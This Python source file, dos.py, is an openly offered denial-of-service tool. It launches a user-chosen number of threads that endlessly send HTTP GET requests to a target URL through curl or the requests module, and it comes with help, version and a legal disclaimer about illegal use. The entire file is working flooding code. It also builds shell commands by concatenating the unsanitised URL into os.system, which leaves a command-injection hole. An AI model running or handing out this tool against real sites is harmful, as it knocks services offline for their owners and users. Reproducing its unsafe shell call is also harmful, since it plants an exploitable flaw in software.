# IMPORTS
import threading # multi-threading
from os import system # execute curl
from sys import argv, stderr, platform # get arguments, platform detection, and print to stderr
import requests # for running get requests
from os import _exit # for exiting and killing all child threads


# FUNCTIONS

# function to start threads
def generate(url, thread_count, verbose, py):
    current_num = 1 # variable to give threads IDs
    print("Starting threads")
    while True:
        if threading.active_count() < thread_count: # executes if more threads are needed
            threading.Thread(target=ping,args=(url, thread_count, verbose, py, current_num,)).start() # spawns thread
            if verbose: # print information if verbose on
                print("New thread started:", str(current_num))
                current_num += 1
        else:
            break
    print("Pinging... (Press enter to stop)")
    input() # pauses main thread's execution
    _exit(0) # special exit to kill everything

# target function for each thread
def ping(url, thread_count, verbose, py, num):
    global ping_count
    while True:
        if threading.active_count() == thread_count: # wait until all threads are spawned

            # using requests module
            if py:
                requests.get(url)

            # using curl
            else:
                if platform == "win32":
                    system("curl " + url + " > NUL") # > NUL is equivalent to &> /dev/null on linux
                else:
                    system("curl " + url + " &> /dev/null") # redirect output to /dev/null (silent)

            # print verbose information
            if verbose:
                ping_count += 1
                print("Thread pinged: " + url + " Total: " + str(ping_count) + " ID: " + str(num))


# MAIN EXECUTION

# exit with no arguments
if len(argv) == 1:
    exit(0)

# get first argument
try:
    url = argv[1]

    # help message
    if url == "--help" or url == "-h":
        print("""Usage:
    python dos.py [options] | [<destination> <# of threads> [flags]]

Flags:
    -v, --verbose: verbose output

    -p, --python: use python's requests module instead of curl. This is much slower and more error prone at high thread counts. Only use this option if you do not have curl

Options:
    -h, --help: prints help message

    -V, --version: prints version information

    -l, --legal: prints legal information

Press enter to stop, and kill all child threads
by Theo Henson (GH: tteeoo/dos) <theodorehenson at protonmail dot com>""")
        exit(0)

    # version information
    if url == "--version" or url == "-V":
        print('''                     
     #               
  mmm#   mmm    mmm  
 #" "#  #" "#  #   " 
 #   #  #   #   """m 
 "#m##  "#m#"  "mmm"

version 0.1.0

by Theo Henson (GH: tteeoo/dos) <theodorehenson at protonmail dot com>
''')
        exit(0)

    # legal information
    if url == "--legal" or url == "-l":
        print("""In addition to the MIT License, this further legal disclosure applies:
I (Theo Henson) am not responsible for the repercussions that you (a user of this software) may face through the illegal usage of this software, nor am I responsible for the damage that any user causes, using this software. By using this software, you take full responsibility, in other words, *use at your own risk*.""")
        exit(0)
    try:
        requests.get(url)
    except requests.exceptions.MissingSchema:
        print("Invalid URL", file=stderr)
        _exit(1)

# error if no url is provided
except IndexError:
    print("No URL provided", file=stderr)
    exit(1)

# get thread count, and error out when necessary
try:
    thread_count = int(argv[2]) + 1
except IndexError:
    print("No thread count provided", file=stderr)
    exit(1)
except ValueError:
    print("Non-integer thread count provided", file=stderr)
    exit(1)

# set some variables
ping_count = 0 # global variable to track ping count accross all threads
verbose = False
py = False

# override verbose variable if options are provided
if "-v" in argv or "--verbose" in argv:
    verbose = True

# override python variable if options are provided
if "-p" in argv or "--python" in argv:
    py = True
    print("Using built-in python requests module")

# start generating threads
generate(url, thread_count, verbose, py)
